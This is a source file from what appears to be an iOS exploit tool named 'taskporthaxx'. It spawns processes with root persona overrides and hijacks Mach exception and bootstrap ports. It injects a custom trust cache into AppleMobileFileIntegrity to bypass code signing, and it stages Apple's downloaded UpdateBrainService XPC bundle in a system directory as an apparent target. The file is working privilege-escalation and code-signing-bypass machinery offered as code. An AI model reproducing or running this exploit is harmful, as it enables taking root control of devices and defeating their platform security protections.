#include "taskporthaxx.h"
#include <signal.h>
#include <unistd.h>
#include "unarchive.h"

#include <IOKit/IOKitLib.h>
uintptr_t brX8Address = 0;
uintptr_t changeLRAddress = 0;
uintptr_t paciaAddress = 0;
BOOL wantsDetach = NO;
uint64_t signed_pointer = 0;
int child_execve(char *exceptionPortName, char *path) {
    mach_port_t exception_port = MACH_PORT_NULL;
    mach_port_t fake_bootstrap_port = MACH_PORT_NULL;
    bootstrap_look_up(bootstrap_port, exceptionPortName, &exception_port);
    assert(exception_port != MACH_PORT_NULL);
    bootstrap_look_up(bootstrap_port, "com.kdt.taskporthaxx.fake_bootstrap_port", &fake_bootstrap_port);
    assert(fake_bootstrap_port != MACH_PORT_NULL);
    
    task_set_exception_ports(mach_task_self(),
        EXC_MASK_ALL | EXC_MASK_CRASH,
        exception_port,
        EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES,
        ARM_THREAD_STATE64);
    mach_port_t bootstrapPort = bootstrap_port;
    task_set_bootstrap_port(mach_task_self(), fake_bootstrap_port);
    
    posix_spawnattr_t attr;
    if(posix_spawnattr_init(&attr) != 0) {
        perror("posix_spawnattr_init");
        return 1;
    }
    
    if(posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETEXEC) != 0) {
        perror("posix_spawnattr_set_flags");
        return 1;
    }
    
    posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){0, bootstrapPort, fake_bootstrap_port}, 3);
    posix_spawnattr_setexceptionports_np(&attr,
        EXC_MASK_ALL | EXC_MASK_CRASH,
        exception_port, EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    char *argv2[] = { path, NULL };
    posix_spawn(NULL, argv2[0], NULL, &attr, argv2, environ);
    perror("posix_spawn");
    return 1;
}

int load_trust_cache(NSString *tcPath)
{
    NSData *tcData = [NSData dataWithContentsOfFile:tcPath];
    if (!tcData) {
        printf("Trust cache file not found: %s\n", tcPath.fileSystemRepresentation);
        return 1;
    }
    CFDictionaryRef match = IOServiceMatching("AppleMobileFileIntegrity");
    io_service_t svc = IOServiceGetMatchingService(0, match);
    io_connect_t conn;
    IOServiceOpen(svc, mach_task_self_, 0, &conn);
    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, tcData.bytes, tcData.length, NULL, NULL, NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("IOConnectCallMethod failed: %s\n", mach_error_string(kr));
        return 1;
    }
    printf("Loaded trust cache from %s\n", tcPath.fileSystemRepresentation);
    IOServiceClose(conn);
    IOObjectRelease(svc);
    return 0;
}

int child_stage1_prepare(void) {
    NSFileManager *fm = NSFileManager.defaultManager;
    NSString *outDir = [fm URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask].lastObject.path;
    NSString *zipPath = [outDir stringByAppendingPathComponent:@"UpdateBrainService.zip"];
    NSString *assetDir = [outDir stringByAppendingPathComponent:@"AssetData"];
    
    if ([fm fileExistsAtPath:zipPath] || ![fm fileExistsAtPath:assetDir]) {
        printf("Downloading UpdateBrainService\n");
        NSURL *url = [NSURL URLWithString:@"https://updates.cdn-apple.com/2022FallFCS/patches/012-73541/F0A2BDFD-317B-4557-BD18-269079BDB196/com_apple_MobileAsset_MobileSoftwareUpdate_UpdateBrain/f9886a753f7d0b2fc3378a28ab6975769f6b1c26.zip"];
        NSData *urlData = [NSData dataWithContentsOfURL:url];
        if (!urlData) {
            printf("Failed to download UpdateBrainService\n");
            return 1;
        }
        
        // Save and extract UpdateBrainService
        [urlData writeToFile:zipPath atomically:YES];
        printf("Downloaded UpdateBrainService to %s\n", zipPath.fileSystemRepresentation);
        printf("Extracting UpdateBrainService\n");
        extract(zipPath, outDir, NULL);
        [NSFileManager.defaultManager removeItemAtPath:zipPath error:nil];
    }
    
    // Copy xpc service
    NSString *execDir = @"/var/db/com.apple.xpc.roleaccountd.staging/exec";
    [fm createDirectoryAtPath:execDir withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *xpcName = @"com.apple.MobileSoftwareUpdate.UpdateBrainService.xpc";
    NSString *outXPCPath = [execDir stringByAppendingPathComponent:xpcName];
    if (![fm fileExistsAtPath:outXPCPath]) {
        NSError *error = nil;
        [fm copyItemAtPath:[assetDir stringByAppendingPathComponent:xpcName] toPath:outXPCPath error:&error];
        if (error) {
            NSLog(@"Failed to copy UpdateBrainService.xpc: %@", error);
            return 1;
        }
    }
    
    printf("Stage 1 setup complete\n");
    return 0;
}


pid_t spawn_exploit_process(mach_port_t exception_port) {
    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_set_persona_np(&attr, /*persona_id=*/99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
    posix_spawnattr_set_persona_uid_np(&attr, 0);
    posix_spawnattr_set_persona_gid_np(&attr, 0);
    //posix_spawnattr_set_ptrauth_task_port_np(&attr, mach_task_self());
    char *argv[] = {**_NSGetArgv(), "child", NULL};
    int ret = posix_spawn(&pid, argv[0], NULL, &attr, argv, environ);
    if (ret) {
        perror("posix_spawn");
        return 0;
    }
    printf("Spawned exploit process with PID %d\n", pid);
    return pid;
}

bool check_exception_server_exists(int thread_id) {
    mach_port_t exception_port = MACH_PORT_NULL;
    char service_name[128];
    snprintf(service_name, sizeof(service_name), "com.kdt.taskporthaxx.exception_server.%d", thread_id);

    kern_return_t kr = bootstrap_look_up(bootstrap_port, service_name, &exception_port);
    if (kr == KERN_SUCCESS && exception_port != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), exception_port);
        return true;
    }
    return false;
}

bool check_fake_bootstrap_server_exists(int thread_id) {
    mach_port_t fake_bootstrap_port = MACH_PORT_NULL;
    char service_name[128];
    snprintf(service_name, sizeof(service_name), "com.kdt.taskporthaxx.fake_bootstrap_port.%d", thread_id);

    kern_return_t kr = bootstrap_look_up(bootstrap_port, service_name, &fake_bootstrap_port);
    if (kr == KERN_SUCCESS && fake_bootstrap_port != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), fake_bootstrap_port);
        return true;
    }
    return false;
}

void cleanup_bootstrap_servers(int thread_count) {
    for (int i = 0; i < thread_count; i++) {
        mach_port_t exception_port = MACH_PORT_NULL;
        mach_port_t fake_bootstrap_port = MACH_PORT_NULL;

        char exception_service_name[128];
        char bootstrap_service_name[128];
        snprintf(exception_service_name, sizeof(exception_service_name), "com.kdt.taskporthaxx.exception_server.%d", i);
        snprintf(bootstrap_service_name, sizeof(bootstrap_service_name), "com.kdt.taskporthaxx.fake_bootstrap_port.%d", i);

        kern_return_t kr = bootstrap_look_up(bootstrap_port, exception_service_name, &exception_port);
        if (kr == KERN_SUCCESS && exception_port != MACH_PORT_NULL) {
            mach_port_deallocate(mach_task_self(), exception_port);
        }

        kr = bootstrap_look_up(bootstrap_port, bootstrap_service_name, &fake_bootstrap_port);
        if (kr == KERN_SUCCESS && fake_bootstrap_port != MACH_PORT_NULL) {
            mach_port_deallocate(mach_task_self(), fake_bootstrap_port);
        }
    }
}

void kill_child_processes(pid_t *pids, int count) {
    for (int i = 0; i < count; i++) {
        if (pids[i] > 0) {
            if (kill(pids[i], 0) == 0) {
                printf("kill %d\n", pids[i]);
                kill(pids[i], SIGTERM);
            }
            pids[i] = -1;
        }
    }
}

